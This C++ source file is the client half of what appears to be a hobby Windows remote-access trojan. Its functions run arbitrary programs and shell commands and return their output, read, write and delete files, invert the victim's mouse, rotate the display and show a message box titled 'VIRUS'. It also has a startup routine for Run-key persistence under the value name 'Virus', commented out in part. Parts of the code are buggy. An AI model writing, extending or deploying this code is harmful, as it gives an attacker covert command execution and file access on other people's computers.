#include "stdafx.h"
#include "Client.h"

bool terminateThread = false;

Client::Client()
{
	addStartup();
}

Client::~Client()
{
	if (invertMouseThread.joinable())
	{
		invertMouseThread.join();
	}
}

//Process Execution
std::string Client::startProcess(const std::string &proc)
{
	std::string res;
	//std::string to LPCWSTR
	int len;
	int length = (int)proc.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, proc.c_str(), length, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, proc.c_str(), length, buf, len);
	std::wstring r(buf);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess((LPCWSTR)r.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		res = "CreateProcess failed";
	}
	else
	{
		res = "Prcess Creation Success";
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return res;
}

std::string Client::runCmdCommand(const std::string &command)
{
	FILE * uname;
	char os[800000];
	int lastchar;

	uname = _popen(command.c_str(), "r");
	lastchar = fread(os, 1, 800000, uname);
	os[lastchar] = '\0';
	_pclose(uname);
	return std::string(os);
}

//File Handling
std::string Client::readFile(const std::string &fileName)
{
	std::ifstream f;
	f.open(fileName);
	if (f.is_open())
	{
		std::string content((std::istreambuf_iterator<char>(f)),
			(std::istreambuf_iterator<char>()));
		f.close();
		return content;
	}
	f.close();
	return std::string("CANNOT OPEN FILE ") + fileName;
}

bool Client::writeFile(const std::string &fileName,const std::string &text)
{
	std::ofstream f;
	f.open(fileName);
	if (f.is_open())
	{
		f << text;
		f.close();
		return true;
	}
	f.close();
	return false;
}

bool Client::deleteFile(const std::string &fileName)
{
	return !std::remove(fileName.c_str());
}


//Funny stuff
void Client::run()
{
	POINT point, current;
	int x, y;
	while (!stopRequested())
	{
		GetCursorPos(&current);
		Sleep(10);
		if (GetCursorPos(&point) != current.y || current.x)
		{
			x = (point.x - current.x) * 2;
			y = (point.y - current.y) * 2;
			SetCursorPos(point.x - x, point.y - y);
		}
	}
	resetPromise();
}

void Client::toggleInvertMouse()
{
	if (!IsMouseInverted)
	{
		if (invertMouseThread.joinable())
		{
			invertMouseThread.join();
		}
		invertMouseThread = std::thread([&]() {
			run();
		});
		IsMouseInverted = true;
	}
	else
	{
		stop();
		IsMouseInverted = false;
	}
}

void Client::addStartup()
{
	LPCWSTR strKeyName = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	/*HKEY hKey = NULL;
	DWORD rtime;

	const char path[] = "C:\\Users\\Doru\\Desktop\\aa.txt";

	//Step 1: Open the key
	long sts = RegOpenKeyEx(HKEY_LOCAL_MACHINE, strKeyName, 0, KEY_READ, &hKey);
	long j = RegSetValueEx(hKey, L"Virus", 0, REG_SZ, (BYTE*)path, strlen(path));
	DWORD length = sizeof(rtime);
	DWORD type = REG_DWORD;
	RegQueryValueEx(HKEY_LOCAL_MACHINE, strKeyName, 0, (LPDWORD)&type, (LPBYTE)&rtime, &length);
	*/





	RegCloseKey(hKey);
}


void Client::rotateDisplay()
{
	DEVMODE dm;
	ZeroMemory(&dm, sizeof(dm));
	dm.dmSize = sizeof(dm);
	if (0 != EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm))
	{
		// swap height and width
		DWORD dwTemp = dm.dmPelsHeight;
		dm.dmPelsHeight = dm.dmPelsWidth;
		dm.dmPelsWidth = dwTemp;

		// determine new orientaion
		switch (dm.dmDisplayOrientation)
		{
		case DMDO_DEFAULT:
			dm.dmDisplayOrientation = DMDO_270;
			break;
		case DMDO_270:
			dm.dmDisplayOrientation = DMDO_180;
			break;
		case DMDO_180:
			dm.dmDisplayOrientation = DMDO_90;
			break;
		case DMDO_90:
			dm.dmDisplayOrientation = DMDO_DEFAULT;
			break;
		default:
			// unknown orientation value
			// add exception handling here
			break;
		}
		long lRet = ChangeDisplaySettings(&dm, 0);
		if (DISP_CHANGE_SUCCESSFUL != lRet)
		{
			// add exception handling here
		}
	}
}

void Client::message(const std::string &m)
{
	int len;
	int length = (int)m.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, m.c_str(), length, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, m.c_str(), length, buf, len);
	std::wstring r(buf);
	MessageBox(NULL, (LPCWSTR)r.c_str(), L"VIRUS", MB_OK | MB_ICONERROR);
}
